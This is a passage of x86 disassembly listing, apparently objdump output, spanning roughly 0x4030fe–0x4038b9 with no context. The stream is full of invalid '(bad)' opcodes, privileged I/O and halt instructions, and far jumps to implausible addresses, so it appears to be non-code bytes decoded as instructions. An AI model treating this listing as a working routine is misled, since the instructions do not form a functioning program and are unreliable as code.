  4030fe:	mov    DWORD PTR [edx-0x50],ebx
  403101:	or     bl,dl
  403103:	jg     0x403128
  403105:	daa    
  403106:	fdiv   DWORD PTR fs:[ecx+eiz*8-0x574f97b2]
  40310e:	inc    ecx
  403110:	das    
  403111:	push   ebp
  403112:	dec    edi
  403113:	or     bl,BYTE PTR [edx+ebp*4+0x60f977d1]
  40311a:	cdq    
  40311b:	mov    esi,0x5c80cd42
  403120:	push   0xb
  403122:	add    BYTE PTR [edx],ch
  403124:	add    dl,bh
  403126:	mov    WORD PTR [ebx-0x3cb17059],es
  40312c:	and    al,0x9f
  40312e:	rol    ch,1
  403130:	loope  0x4030d5
  403132:	fscale 
  403134:	xchg   esi,eax
  403135:	xor    eax,0x3f7c2849
  40313a:	jb     0x403141
  40313c:	mov    ebx,0xda01d2d7
  403141:	retf   0xcd32
  403144:	cmp    al,al
  403146:	jge    0x403123
  403148:	out    dx,eax
  403149:	es loopne 0x4031ae
  40314c:	loopne 0x403122
  40314e:	adc    DWORD PTR [esi+edi*8],0x7cf0bc7a
  403155:	xchg   ebp,eax
  403156:	xchg   edi,eax
  403157:	nop
  403158:	or     BYTE PTR [ebx+0x2084d266],0xf3
  40315f:	rol    BYTE PTR [esp+edx*8],0xd
  403163:	imul   edx,ecx,0x5a
  403166:	fnstenv [esi-0x681d7149]
  40316c:	mov    bl,0x43
  40316e:	sub    eax,0x4030a035
  403173:	inc    eax
  403174:	es adc eax,0xf5d572bc
  40317a:	mov    DWORD PTR [esi],esi
  40317c:	inc    ecx
  40317d:	dec    ebx
  40317e:	add    eax,0xcaf6f9bd
  403183:	stc    
  403184:	and    eax,0x289b85c8
  403189:	xchg   esp,eax
  40318a:	push   ebp
  40318b:	xor    al,0x87
  40318d:	jg     0x4031e4
  40318f:	xor    dl,BYTE PTR [ecx+ebx*2-0x17]
  403193:	xchg   ecx,eax
  403194:	sbb    al,0x55
  403196:	fidiv  DWORD PTR [esi+0x7e3fee8e]
  40319c:	xor    ah,BYTE PTR [ebx-0x6f7a57e0]
  4031a2:	sbb    esp,DWORD PTR [ebx]
  4031a4:	push   ebx
  4031a5:	loopne 0x403187
  4031a7:	push   esp
  4031a8:	in     al,dx
  4031a9:	and    DWORD PTR [ebx+0x3b],0x47
  4031ad:	xchg   BYTE PTR [ebx],dh
  4031af:	in     eax,dx
  4031b0:	pop    ss
  4031b1:	in     al,dx
  4031b2:	sub    edx,DWORD PTR [ecx]
  4031b4:	push   esp
  4031b5:	repz add DWORD PTR [ecx-0x43],edx
  4031b9:	cld    
  4031ba:	(bad)  
  4031bb:	(bad)  
  4031bc:	add    DWORD PTR [edi-0x3406e6a1],ecx
  4031c2:	pop    ecx
  4031c3:	cmp    dl,BYTE PTR [edi+0x1b]
  4031c6:	jecxz  0x40316a
  4031c8:	ja     0x40321a
  4031ca:	mov    BYTE PTR [ebx+edx*4-0x4d],bl
  4031ce:	or     eax,0xed2b3a0b
  4031d3:	out    0x5a,al
  4031d5:	sub    eax,0x77cc64f9
  4031da:	cld    
  4031db:	scas   eax,DWORD PTR es:[edi]
  4031dc:	push   es
  4031dd:	out    0x1a,eax
  4031df:	jg     0x403198
  4031e1:	adc    al,0x59
  4031e3:	addr16 out dx,eax
  4031e5:	push   ebx
  4031e6:	sar    bh,cl
  4031e8:	xchg   edx,eax
  4031e9:	imul   ebp,esi,0x2361710c
  4031ef:	mov    ecx,0x4e42a90b
  4031f4:	ins    BYTE PTR es:[edi],dx
  4031f5:	add    eax,0x22d9ab1b
  4031fa:	mov    ds:0x6af96f35,eax
  4031ff:	ret    0xb9eb
  403202:	xchg   esi,eax
  403203:	(bad)  
  403204:	jecxz  0x403189
  403206:	loop   0x4031af
  403208:	pop    esi
  403209:	hlt    
  40320a:	imul   eax,edx,0xe0db09b9
  403210:	push   ebx
  403211:	enter  0xc153,0x84
  403215:	xor    DWORD PTR [eax-0x3c],eax
  403218:	jo     0x4031a3
  40321a:	cmc    
  40321b:	adc    eax,0xcabf8642
  403220:	das    
  403221:	xchg   ebx,eax
  403222:	in     eax,0xb2
  403224:	jecxz  0x403238
  403226:	nop
  403227:	fidiv  DWORD PTR [edx]
  403229:	lea    ecx,[ecx+edx*4-0x51]
  40322d:	mov    esi,ss
  40322f:	cwde   
  403230:	ins    BYTE PTR es:[edi],dx
  403231:	arpl   WORD PTR [edi+0x44],cx
  403234:	sbb    esp,edx
  403236:	add    eax,0xbb4c0aa0
  40323b:	mov    ch,0x86
  40323d:	imul   edx,ebx,0x5c2e52fa
  403243:	jg     0x403292
  403245:	mul    ebx
  403247:	lock in al,0x1e
  40324a:	mov    esp,0x43fd23f8
  40324f:	xor    BYTE PTR [esp+ecx*4+0x55],ch
  403253:	repnz push edi
  403255:	mov    dl,0x20
  403257:	out    dx,eax
  403258:	(bad)  
  403259:	std    
  40325a:	aaa    
  40325b:	dec    ebp
  40325c:	ja     0x40322f
  40325e:	faddp  st(6),st
  403260:	leave  
  403261:	pop    es
  403262:	adc    eax,0xfa5b70a8
  403267:	iret   
  403268:	div    BYTE PTR [ebp+ecx*8+0x6f]
  40326c:	mov    bl,BYTE PTR [edi]
  40326e:	aaa    
  40326f:	scas   eax,DWORD PTR es:[edi]
  403270:	xchg   ebx,eax
  403271:	or     al,0xb7
  403273:	xor    ch,BYTE PTR [edi+ebx*8]
  403276:	js     0x4032b2
  403278:	pop    ecx
  403279:	pusha  
  40327a:	aam    0xd6
  40327c:	cli    
  40327d:	out    dx,eax
  40327e:	pop    edx
  40327f:	fsubr  QWORD PTR [ebp+eax*2+0x2c014b13]
  403286:	adc    al,0xb2
  403288:	jecxz  0x4032ba
  40328a:	lea    sp,[eax+0x7d]
  40328e:	xor    dh,BYTE PTR [ebp+0x18df2f04]
  403294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403295:	push   esp
  403296:	push   cs
  403297:	xor    cl,0x14
  40329a:	jmp    0x8926:0x3d38255d
  4032a1:	jecxz  0x4032c3
  4032a3:	mov    ah,0x3e
  4032a5:	xchg   ebx,eax
  4032a6:	or     eax,0x23da24e5
  4032ab:	pop    esi
  4032ac:	imul   eax,ecx,0xa620cb0
  4032b2:	and    eax,0x7bf57cd5
  4032b7:	and    edi,esi
  4032b9:	fild   DWORD PTR [ecx+0x475a357c]
  4032bf:	repz fsubr st,st(5)
  4032c2:	sbb    ebx,DWORD PTR [di-0x21]
  4032c6:	f2xm1  
  4032c8:	mov    ds:0x12ccd6b,al
  4032cd:	pop    ds
  4032ce:	aaa    
  4032cf:	aaa    
  4032d0:	jle    0x403310
  4032d2:	ret    
  4032d3:	outs   dx,BYTE PTR ds:[esi]
  4032d4:	stos   BYTE PTR es:[edi],al
  4032d5:	jmp    0x23685b66
  4032da:	pop    edi
  4032db:	xchg   edi,eax
  4032dc:	and    eax,0x70860d40
  4032e1:	lock push edi
  4032e3:	dec    eax
  4032e4:	xchg   BYTE PTR ds:0x26e0b7ed,dl
  4032ea:	test   eax,0xad7fd9c2
  4032ef:	pop    es
  4032f0:	jle    0x403340
  4032f2:	into   
  4032f3:	out    0x44,al
  4032f5:	add    DWORD PTR [edx],eax
  4032f7:	dec    ebp
  4032f8:	sub    eax,0x3d7d0eab
  4032fd:	or     al,BYTE PTR [eax]
  4032ff:	shl    DWORD PTR ds:0xf6f353a2,cl
  403305:	imul   eax,edx,0x17
  403308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403309:	enter  0x9918,0x95
  40330d:	mov    al,ds:0xdbe1aa2a
  403312:	js     0x4032fd
  403314:	data16 mov dl,0x82
  403317:	ds and eax,0x732a885f
  40331d:	jp     0x4032f1
  40331f:	sub    al,0x7
  403321:	mov    DWORD PTR [esi-0x291a8cc7],eax
  403327:	sub    DWORD PTR [eax],edx
  403329:	dec    ebx
  40332a:	sub    eax,0xb218c3e6
  40332f:	xchg   esp,eax
  403330:	ds push edx
  403332:	inc    ebp
  403333:	or     BYTE PTR [eax],dl
  403335:	fisubr WORD PTR fs:[ecx-0x4a]
  403339:	outs   dx,BYTE PTR ds:[esi]
  40333a:	arpl   WORD PTR [ebx-0x1],bp
  40333d:	test   eax,0x54a8210e
  403342:	nop
  403343:	and    ecx,DWORD PTR [ebx+0x28177540]
  403349:	js     0x4033b5
  40334b:	mov    edx,0x880ca294
  403350:	mov    dl,0xe6
  403352:	dec    edx
  403353:	mov    BYTE PTR [ebx-0xc],ch
  403356:	repz jl 0x403331
  403359:	leave  
  40335a:	sub    bh,dl
  40335c:	hlt    
  40335d:	push   esi
  40335e:	add    bl,BYTE PTR [ebx-0xd86e957]
  403364:	jbe    0x403311
  403366:	and    BYTE PTR [edx-0x1f],bl
  403369:	ss sub al,0xd2
  40336c:	fcomi  st,st(5)
  40336e:	inc    edx
  40336f:	jne    0x403387
  403371:	mul    DWORD PTR [edx]
  403373:	push   0x42ddd449
  403378:	add    DWORD PTR [ecx+0x36],eax
  40337b:	rcr    BYTE PTR [edx+0x50],0xad
  40337f:	sbb    eax,0x145484e6
  403384:	mov    dl,0x1
  403386:	pushf  
  403387:	adc    eax,0x5fbc0724
  40338c:	inc    edi
  40338d:	or     DWORD PTR [edx-0x16ff6df5],0xab1b5b2c
  403397:	dec    edx
  403398:	push   eax
  403399:	dec    esi
  40339a:	xchg   edi,eax
  40339b:	pop    esi
  40339c:	mov    dl,0xa
  40339e:	lods   al,BYTE PTR ds:[esi]
  40339f:	popa   
  4033a0:	xchg   edx,eax
  4033a1:	mov    es,WORD PTR [esi]
  4033a3:	pop    es
  4033a4:	push   cs
  4033a5:	xlat   BYTE PTR ds:[ebx]
  4033a6:	push   0x30
  4033a8:	inc    eax
  4033a9:	aas    
  4033aa:	shl    DWORD PTR [eax+0x4cb10a33],1
  4033b0:	(bad)  
  4033b1:	jb     0x40333f
  4033b3:	jmp    0x938fb850
  4033b8:	mov    ch,0xd5
  4033ba:	push   ebp
  4033bb:	sbb    al,0x7d
  4033bd:	leave  
  4033be:	aad    0xbb
  4033c0:	mov    ds:0xca9e21b5,eax
  4033c5:	stos   DWORD PTR es:[edi],eax
  4033c6:	outs   dx,BYTE PTR ds:[esi]
  4033c7:	loope  0x403410
  4033c9:	dec    ebx
  4033ca:	mov    ah,0x9
  4033cc:	cwde   
  4033cd:	lahf   
  4033ce:	test   BYTE PTR [esi-0xf],cl
  4033d1:	xor    ah,BYTE PTR [eax]
  4033d3:	xchg   ebp,eax
  4033d4:	test   DWORD PTR [ecx+0x196ca76b],ecx
  4033da:	adc    DWORD PTR [edx],esi
  4033dc:	inc    esp
  4033dd:	sahf   
  4033de:	adc    BYTE PTR [ecx+eiz*4],dh
  4033e1:	mov    ds:0x2a9469c4,eax
  4033e6:	xchg   edx,eax
  4033e7:	jge    0x40342f
  4033e9:	es aad 0x40
  4033ec:	in     eax,0xf4
  4033ee:	aad    0xf4
  4033f0:	sbb    DWORD PTR ds:0x809a5d65,esp
  4033f6:	data16 fiadd DWORD PTR [ebx-0x445130a8]
  4033fd:	or     ebp,DWORD PTR [ebx-0x4f]
  403400:	mov    edx,0x7bf24b74
  403405:	je     0x403406
  403407:	jl     0x40347b
  403409:	pop    edi
  40340a:	fisttp WORD PTR [esi]
  40340c:	repz inc eax
  40340e:	push   cs
  40340f:	mov    ds:0xae211af6,eax
  403414:	stc    
  403415:	push   ebp
  403416:	sahf   
  403417:	mov    al,ah
  403419:	mov    esi,0x34adeb34
  40341e:	retf   
  40341f:	sbb    ebx,DWORD PTR [ebx]
  403421:	mov    ds:0xb2c43b06,al
  403426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403427:	adc    ecx,eax
  403429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40342a:	std    
  40342b:	aam    0x16
  40342d:	or     edi,edi
  40342f:	push   ebx
  403430:	adc    DWORD PTR [edx-0x157a877e],ebp
  403436:	sbb    al,dl
  403438:	cli    
  403439:	mov    ds:0x88498c45,al
  40343e:	push   ebp
  40343f:	pop    ebp
  403440:	and    eax,DWORD PTR [edx+0xc]
  403443:	push   edx
  403444:	rcl    BYTE PTR [edx+esi*8-0x6ce2ab8c],1
  40344b:	or     DWORD PTR [edx],eax
  40344d:	add    DWORD PTR [esi+0xf],0xffffffa4
  403451:	sub    bl,BYTE PTR [eax-0x77]
  403454:	ret    
  403455:	xchg   DWORD PTR [eax-0x24a9d22e],edi
  40345b:	test   eax,0x37471235
  403460:	ret    
  403461:	popf   
  403462:	aaa    
  403463:	dec    ebx
  403464:	push   0xf88ab543
  403469:	fnstsw WORD PTR [eax]
  40346b:	jge    0x4033fc
  40346d:	jnp    0x40345a
  40346f:	loop   0x403435
  403471:	or     eax,DWORD PTR [esi]
  403473:	mov    esi,0xc5454c82
  403478:	cli    
  403479:	pop    ss
  40347a:	rol    bl,cl
  40347c:	add    eax,DWORD PTR [edx+0x5785521d]
  403482:	cwde   
  403483:	ror    DWORD PTR [eax-0x1587eda8],cl
  403489:	loopne 0x403411
  40348b:	xchg   ecx,eax
  40348c:	jmp    0xda99:0x157a2bb9
  403493:	sbb    ebx,0x4c
  403496:	cmp    edx,DWORD PTR ds:0xd68f89d
  40349c:	and    BYTE PTR [eax],dl
  40349e:	sahf   
  40349f:	push   ss
  4034a0:	push   edx
  4034a1:	pop    esp
  4034a2:	iret   
  4034a3:	out    0xc6,eax
  4034a5:	cmp    ebp,DWORD PTR [edi]
  4034a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034a8:	into   
  4034a9:	cmp    BYTE PTR [ebx-0x15],cl
  4034ac:	jo     0x4034d5
  4034ae:	outs   dx,BYTE PTR ds:[esi]
  4034af:	(bad)  
  4034b0:	clc    
  4034b1:	mov    esi,0x702ebef1
  4034b6:	mov    cl,0x79
  4034b8:	push   esi
  4034b9:	test   al,0x53
  4034bb:	sub    eax,0xe0bb0211
  4034c0:	rcl    al,cl
  4034c2:	mov    ecx,DWORD PTR [ecx]
  4034c4:	sub    cl,BYTE PTR [ebx-0x5f]
  4034c7:	add    esi,DWORD PTR [eax+0x4e]
  4034ca:	xor    al,0x6f
  4034cc:	test   BYTE PTR [edi],dl
  4034ce:	push   ebx
  4034cf:	repz mov si,cx
  4034d3:	pop    es
  4034d4:	dec    eax
  4034d5:	mov    al,ds:0x1e54f1fa
  4034da:	mov    ss,ebp
  4034dc:	pop    ebx
  4034dd:	loope  0x4034f8
  4034df:	rcr    BYTE PTR [ebp+0x44],cl
  4034e2:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4034e4:	aaa    
  4034e5:	inc    edx
  4034e6:	adc    eax,0xfc17b379
  4034eb:	mov    esi,DWORD PTR [edx]
  4034ed:	data16 xor BYTE PTR [eax],cl
  4034f0:	or     DWORD PTR [ecx+ebp*4+0x798313ff],edx
  4034f7:	(bad)  
  4034f8:	retf   
  4034f9:	pop    ebx
  4034fa:	mov    eax,ds:0x6b5f7b68
  4034ff:	or     al,0x96
  403501:	(bad)  
  403502:	into   
  403503:	push   ds
  403504:	outs   dx,DWORD PTR ds:[esi]
  403505:	fdecstp 
  403507:	push   ds
  403508:	and    BYTE PTR [ecx-0x2d9860a0],ch
  40350e:	outs   dx,BYTE PTR ds:[esi]
  40350f:	add    eax,0x90283972
  403514:	test   al,0x3c
  403516:	imul   ebx,DWORD PTR [ebp-0x2e],0xffffff97
  40351a:	mov    bl,BYTE PTR [eax-0x27d448ce]
  403520:	fcmovne st,st(0)
  403522:	jp     0x4034d1
  403524:	jg     0x4034eb
  403526:	jne    0x403517
  403528:	enter  0x706d,0x98
  40352c:	sbb    eax,0x21991284
  403531:	push   0x8d8154cd
  403536:	loope  0x4034ef
  403538:	lock mov dl,0x11
  40353b:	dec    ebx
  40353c:	arpl   bx,bp
  40353e:	sahf   
  40353f:	sbb    cl,BYTE PTR [ebx+0x641e24bf]
  403545:	xlat   BYTE PTR ds:[ebx]
  403546:	xor    DWORD PTR [esi-0x5a094a76],edi
  40354c:	lahf   
  40354d:	popa   
  40354e:	inc    ecx
  40354f:	add    al,0x16
  403551:	rol    DWORD PTR [ecx+ebp*4-0x66],cl
  403555:	call   0x306179e6
  40355a:	outs   dx,DWORD PTR ds:[esi]
  40355b:	jno    0x40359e
  40355d:	test   DWORD PTR [ebx+eiz*4-0x53],ecx
  403561:	mov    bh,bh
  403563:	push   ds
  403564:	pop    esi
  403565:	mov    es,WORD PTR [esi]
  403567:	bound  ebx,QWORD PTR [eax]
  403569:	cmp    ecx,DWORD PTR [ebp+0x70]
  40356c:	outs   dx,DWORD PTR ds:[esi]
  40356d:	push   ds
  40356e:	ret    
  40356f:	mov    bl,0xfe
  403571:	xchg   esp,eax
  403572:	adc    eax,0x3288f1a5
  403577:	dec    esi
  403578:	into   
  403579:	cli    
  40357a:	mov    al,0xe0
  40357c:	push   esi
  40357d:	test   bl,ch
  40357f:	test   al,0xa7
  403581:	mov    ds:0xd3c70f18,al
  403586:	repz jae 0x4035da
  403589:	sub    al,0x8f
  40358b:	dec    ebx
  40358c:	dec    ebp
  40358d:	push   ebp
  40358e:	out    0xb,eax
  403590:	(bad)
  403593:	jp     0x40358f
  403595:	jle    0x403557
  403597:	add    bl,BYTE PTR [edx+0x68]
  40359a:	or     ebx,DWORD PTR [ebp+0x5b]
  40359d:	mov    dl,0x66
  40359f:	mov    ebp,0x6af14cd1
  4035a4:	pop    ebx
  4035a5:	and    al,0x8c
  4035a7:	adc    eax,0xd168af4c
  4035ac:	pop    esi
  4035ad:	ret    
  4035ae:	sub    dh,ch
  4035b0:	cmp    al,BYTE PTR [eax-0x3b9b9270]
  4035b6:	xor    ah,BYTE PTR cs:[eax+0x4ae6a21a]
  4035bd:	sbb    DWORD PTR [ebx],edx
  4035bf:	retf   
  4035c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035c1:	xor    ch,bl
  4035c3:	push   ebx
  4035c4:	pop    ebx
  4035c5:	xor    ah,BYTE PTR [esi-0x77dcfcad]
  4035cb:	mov    bl,BYTE PTR [edx-0x5]
  4035ce:	xor    edx,DWORD PTR ds:0xc07da541
  4035d4:	popa   
  4035d5:	cmc    
  4035d6:	clc    
  4035d7:	das    
  4035d8:	retf   
  4035d9:	aad    0xfe
  4035db:	inc    ebp
  4035dc:	and    eax,DWORD PTR [ebp+edx*1+0x10]
  4035e0:	loope  0x4035b6
  4035e2:	mov    ah,0x77
  4035e4:	push   esp
  4035e5:	mov    eax,0x3968b02a
  4035ea:	cmp    al,0x14
  4035ec:	inc    ebp
  4035ed:	adc    al,0xfb
  4035ef:	cli    
  4035f0:	(bad)  
  4035f1:	mul    dh
  4035f3:	sub    ebp,DWORD PTR [ecx-0x66]
  4035f6:	sub    eax,0x8b12e88
  4035fb:	in     al,dx
  4035fc:	pop    edi
  4035fd:	into   
  4035fe:	xchg   ebp,eax
  4035ff:	adc    eax,esp
  403601:	sub    al,BYTE PTR [eax+esi*4-0x29]
  403605:	and    ch,bl
  403607:	sbb    DWORD PTR [eax+0x4f],esp
  40360a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40360b:	push   edx
  40360c:	popa   
  40360d:	out    0x5f,eax
  40360f:	fldenv [edx-0x24]
  403612:	cs push eax
  403614:	xchg   ecx,eax
  403615:	pop    esi
  403616:	dec    ecx
  403617:	test   DWORD PTR [esi-0x9f64ac1],esi
  40361d:	cmp    BYTE PTR [ebx+0x5c],dl
  403620:	adc    al,0xf3
  403622:	or     eax,DWORD PTR [edi+0x61]
  403625:	sbb    al,0x42
  403627:	mov    ebx,0x988b794d
  40362c:	stos   BYTE PTR es:[edi],al
  40362d:	icebp  
  40362e:	cmp    esp,DWORD PTR ds:0xde212169
  403634:	jle    0x40360f
  403636:	enter  0xa246,0x63
  40363a:	mov    ebx,0x7cecb357
  40363f:	aad    0xfa
  403641:	stc    
  403642:	xchg   edi,eax
  403643:	xchg   edx,eax
  403644:	and    ah,ah
  403646:	or     ebx,edx
  403648:	popf   
  403649:	pushf  
  40364a:	jl     0x40363f
  40364c:	ins    BYTE PTR es:[edi],dx
  40364d:	jb     0x40369f
  40364f:	ror    DWORD PTR [eax+0x74966941],cl
  403655:	push   cs
  403656:	ret    
  403657:	push   eax
  403658:	push   edi
  403659:	inc    eax
  40365a:	sub    bl,BYTE PTR [edi-0x3c62e40a]
  403660:	das    
  403661:	xchg   DWORD PTR [ecx],eax
  403663:	ss jmp 0x12a75b6f
  403669:	scas   al,BYTE PTR es:[edi]
  40366a:	pop    edi
  40366b:	clc    
  40366c:	xchg   ebp,eax
  40366d:	dec    eax
  40366e:	imul   edx
  403670:	scas   eax,DWORD PTR es:[edi]
  403671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403672:	imul   esi,DWORD PTR [ebp-0x5f],0x62
  403676:	inc    BYTE PTR [edx]
  403678:	inc    edx
  403679:	addr16 sahf 
  40367b:	loopne 0x4036b4
  40367d:	mov    edi,0x6ebdba59
  403682:	xor    eax,0xad262fb6
  403687:	add    edx,DWORD PTR [eax+0x29]
  40368a:	push   edi
  40368b:	(bad)  
  40368c:	fdivrp st(7),st
  40368e:	cmp    eax,0x69fe3bcc
  403693:	pop    ecx
  403694:	sahf   
  403695:	sar    bh,1
  403697:	outs   dx,BYTE PTR ds:[esi]
  403698:	mov    BYTE PTR ds:0xc60e8a2,bh
  40369e:	test   al,0x1a
  4036a0:	pop    ecx
  4036a1:	pop    ebx
  4036a2:	das    
  4036a3:	xchg   esi,eax
  4036a4:	and    eax,ebp
  4036a6:	jp     0x403694
  4036a8:	jb     0x403657
  4036aa:	xor    DWORD PTR [edx],ebx
  4036ac:	xor    eax,esi
  4036ae:	nop
  4036af:	or     edx,DWORD PTR [esi]
  4036b1:	std    
  4036b2:	and    ecx,esi
  4036b4:	mov    eax,ds:0xbcd0e247
  4036b9:	pop    ebx
  4036ba:	xchg   edi,eax
  4036bb:	sar    DWORD PTR [ecx+0x2e],cl
  4036be:	mov    dh,BYTE PTR [ecx+0x32484db6]
  4036c4:	xchg   esi,eax
  4036c5:	pop    edx
  4036c6:	cmp    BYTE PTR [esi],cl
  4036c8:	xor    al,BYTE PTR [edi+0x7]
  4036cb:	xor    BYTE PTR [esi+esi*2],al
  4036ce:	pop    eax
  4036cf:	into   
  4036d0:	aam    0x7
  4036d2:	rcl    dl,cl
  4036d4:	or     eax,0x9ddb660d
  4036d9:	cmp    esp,DWORD PTR [ebx]
  4036db:	popf   
  4036dc:	(bad)  [edx]
  4036de:	mov    DWORD PTR [ecx+edx*8-0x4c],ecx
  4036e2:	das    
  4036e3:	add    DWORD PTR [edx+0x2eae526b],ecx
  4036e9:	push   es
  4036ea:	push   esp
  4036eb:	jmp    0xe51f:0xd811df71
  4036f2:	lea    ebp,[esi-0x79c73413]
  4036f8:	dec    eax
  4036f9:	and    ch,BYTE PTR [esi+ebx*1+0x77]
  4036fd:	cwde   
  4036fe:	push   edi
  4036ff:	rcl    DWORD PTR [edx-0x51],0xd0
  403703:	mov    bl,0x5f
  403705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403706:	sbb    ebx,DWORD PTR [ebx+0x25]
  403709:	pop    ds
  40370a:	fmul   DWORD PTR [ecx]
  40370c:	sar    BYTE PTR gs:[esi+0x699fd761],1
  403713:	mov    dh,0xf0
  403715:	icebp  
  403716:	cmp    esp,ebx
  403718:	inc    ebx
  403719:	dec    ecx
  40371a:	icebp  
  40371b:	mov    DWORD PTR [ebx],ecx
  40371d:	jg     0x403771
  40371f:	dec    edx
  403720:	scas   al,BYTE PTR es:[edi]
  403721:	add    BYTE PTR [esi],0x30
  403724:	pop    ebp
  403725:	xchg   ecx,eax
  403726:	push   edi
  403727:	jmp    0x40377e
  403729:	sub    BYTE PTR [ebp+edx*8-0x3539fabf],dh
  403730:	add    eax,0x693564af
  403735:	lahf   
  403736:	jge    0x4036dc
  403738:	push   esi
  403739:	push   esi
  40373a:	cmp    BYTE PTR [ebx+0x26],0xd
  40373e:	mov    DWORD PTR [esi],edi
  403740:	pop    ds
  403741:	imul   esp,DWORD PTR [eax-0x540d6636],0xffffffb6
  403748:	stos   BYTE PTR es:[edi],al
  403749:	pop    ebp
  40374a:	add    ebx,edx
  40374c:	repnz push ebx
  40374e:	sub    esp,edx
  403750:	pop    es
  403751:	push   es
  403752:	add    cl,cl
  403754:	xor    al,0x31
  403756:	icebp  
  403757:	mov    ebp,0x3ae6bde8
  40375c:	mov    al,0xb5
  40375e:	pop    esi
  40375f:	icebp  
  403760:	clc    
  403761:	dec    eax
  403762:	sahf   
  403763:	pusha  
  403764:	(bad)  
  403765:	ss jl  0x40377d
  403768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403769:	sar    BYTE PTR [esi+eiz*2+0x73],1
  40376d:	pop    esi
  40376e:	cmp    al,0x72
  403770:	ins    BYTE PTR es:[edi],dx
  403771:	jge    0x40376f
  403773:	mov    eax,0x7cea5af6
  403778:	clc    
  403779:	mov    eax,ds:0x76cc8da4
  40377e:	sub    eax,0xa9919ac8
  403783:	jmp    0x4037ec
  403785:	mov    ebx,0xbd14e0b4
  40378a:	adc    ch,BYTE PTR [edx]
  40378c:	std    
  40378d:	dec    BYTE PTR [ecx-0x3fb56a72]
  403793:	dec    eax
  403794:	jecxz  0x4037cb
  403796:	rcr    DWORD PTR ds:0x3058d8bc,cl
  40379c:	jnp    0x4037cf
  40379e:	jne    0x403764
  4037a0:	xchg   DWORD PTR fs:[ebx+0x49],esp
  4037a4:	push   esp
  4037a5:	dec    esi
  4037a6:	sub    dh,BYTE PTR [edi+ebx*2-0x18]
  4037aa:	mov    esp,0xa483b655
  4037af:	or     cl,ch
  4037b1:	dec    edi
  4037b2:	mov    BYTE PTR [ebx],dl
  4037b4:	add    ah,ah
  4037b6:	xlat   BYTE PTR ds:[ebx]
  4037b7:	sub    BYTE PTR [eax+0xe7aae9e],ah
  4037bd:	mov    ebp,0xb1fdf1be
  4037c2:	inc    ebx
  4037c3:	cli    
  4037c4:	in     al,dx
  4037c5:	in     eax,0x7b
  4037c7:	pop    esi
  4037c8:	mov    ch,0x7b
  4037ca:	dec    ecx
  4037cb:	es push cs
  4037cd:	ret    
  4037ce:	add    esi,DWORD PTR [edx-0x6a]
  4037d1:	test   al,0xa0
  4037d3:	or     ah,cl
  4037d5:	pop    eax
  4037d6:	icebp  
  4037d7:	popf   
  4037d8:	test   DWORD PTR [esi+ecx*8+0x44],0x2b817bc7
  4037e0:	jge    0x4037db
  4037e2:	sbb    BYTE PTR [ebx+0x63],ch
  4037e5:	scas   eax,DWORD PTR es:[edi]
  4037e6:	mov    ebx,0xea02ed09
  4037eb:	cmovno ebx,esi
  4037ee:	(bad)  
  4037ef:	mov    ah,0xc4
  4037f1:	and    BYTE PTR [esi+0x5776d31a],ch
  4037f7:	cs xchg edi,eax
  4037f9:	and    edi,esi
  4037fb:	xchg   edx,eax
  4037fc:	fisubr WORD PTR gs:[eax]
  4037ff:	push   0xffffffd4
  403801:	fsubr  DWORD PTR [ebp-0x62]
  403804:	neg    BYTE PTR [esi]
  403806:	sbb    dl,BYTE PTR [ebx]
  403808:	pushf  
  403809:	add    edi,DWORD PTR [eax]
  40380b:	in     eax,dx
  40380c:	(bad)  
  40380d:	les    esp,FWORD PTR [ecx-0x296e592e]
  403813:	push   esi
  403814:	pusha  
  403815:	inc    ch
  403817:	dec    eax
  403818:	xchg   ebp,eax
  403819:	test   DWORD PTR [ebp+0x58],ebp
  40381c:	leave  
  40381d:	iret   
  40381e:	lahf   
  40381f:	sti    
  403820:	popf   
  403821:	das    
  403822:	mov    ch,0x7c
  403824:	out    dx,al
  403825:	mov    ds:0x58a323cd,al
  40382a:	pop    es
  40382b:	test   DWORD PTR [esi],esp
  40382d:	pop    ds
  40382e:	inc    ebp
  40382f:	or     BYTE PTR [ecx-0xd],0xce
  403833:	fst    DWORD PTR [ebp+0x4e]
  403836:	ds out 0x7d,al
  403839:	jp     0x40388c
  40383b:	ss xor eax,0x86828f05
  403841:	je     0x40384c
  403843:	test   eax,0x6123c82d
  403848:	mov    edi,0x79e9fd3
  40384d:	out    dx,eax
  40384e:	cwde   
  40384f:	push   esp
  403850:	and    ebx,DWORD PTR ds:0x963a1a89
  403856:	push   esp
  403857:	into   
  403858:	adc    eax,0x2dfd2f7d
  40385d:	ss retf 0x1dc4
  403861:	mov    ecx,0x7a318bec
  403866:	test   eax,0x3760b3b
  40386b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40386c:	adc    al,0xe7
  40386e:	sbb    DWORD PTR [eax+0x3410f7e1],ecx
  403874:	dec    ebp
  403875:	mov    gs,ecx
  403877:	imul   ebx,DWORD PTR [edi+0x50494cda],0x8
  40387e:	adc    ebx,DWORD PTR [edi]
  403880:	jnp    0x403882
  403882:	dec    esi
  403883:	mov    al,ds:0xbe40dae8
  403888:	mov    al,0xce
  40388a:	sbb    bh,BYTE PTR [ecx+0x7d255a24]
  403890:	xchg   esi,eax
  403891:	test   DWORD PTR [edi],ecx
  403893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403894:	in     al,0x8d
  403896:	mov    al,0x91
  403898:	sbb    DWORD PTR [ecx],edi
  40389a:	(bad)  
  40389c:	jmp    0x4038b9
  40389e:	mov    DWORD PTR [edi+ebp*4+0x4a],ecx
  4038a2:	adc    BYTE PTR [eax-0x44],bh
  4038a5:	stos   BYTE PTR es:[edi],al
  4038a6:	jbe    0x4038bf
  4038a8:	cmp    DWORD PTR [edx-0x7b556e47],edx
  4038ae:	xlat   BYTE PTR ds:[ebx]
  4038af:	fstp   QWORD PTR [edi+ecx*8-0x33603bae]
  4038b6:	int3   
  4038b7:	out    0xd0,eax
  4038b9:	jl     0x403913
